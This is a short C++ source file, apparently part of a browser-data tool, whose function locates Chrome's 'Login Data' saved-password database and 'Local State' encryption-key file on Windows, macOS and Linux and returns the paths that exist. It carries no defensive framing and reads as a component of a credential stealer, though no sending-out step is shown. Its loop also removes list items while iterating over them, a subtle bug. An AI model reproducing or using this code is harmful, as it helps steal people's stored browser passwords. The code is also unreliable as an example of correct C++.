//
// Created by jkearnsl on 10.02.24.
//

#include "browser_data.h"

std::list<std::string> chrome(const std::string& osName) {
    std::list<std::string> data;
    const char* username = std::getenv("USER"); // for Linux and MacOS
    if (osName == "Windows") {
        username = std::getenv("USERNAME");
        data.emplace_back(R"(C:\Users\)" +  std::string(username) + R"(\AppData\Local\Google\Chrome\User Data\Default\Login Data)");
        data.emplace_back(R"(C:\Users\)" +  std::string(username) + R"(\AppData\Local\Google\Chrome\User Data\Local State)");
    } else if (osName == "MacOS") {
        data.emplace_back("/Users/" +  std::string(username) + "/Library/Application Support/Google/Chrome/Default/Login Data");
        data.emplace_back("/Users/" +  std::string(username) + "/Library/Application Support/Google/Chrome/Local State");
    } else if (osName == "Linux") {
        data.emplace_back("/home/" +  std::string(username) + "/.config/google-chrome/Default/Login Data");
        data.emplace_back("/home/" +  std::string(username) + "/.config/google-chrome/Local State");
    }
    FILE* file;
    for (const auto& filepath : data) {
        file = fopen(filepath.c_str(), "r");
        if (file) {
            fclose(file);
        } else {
            data.remove(filepath);
        }
    }
    return data;
}
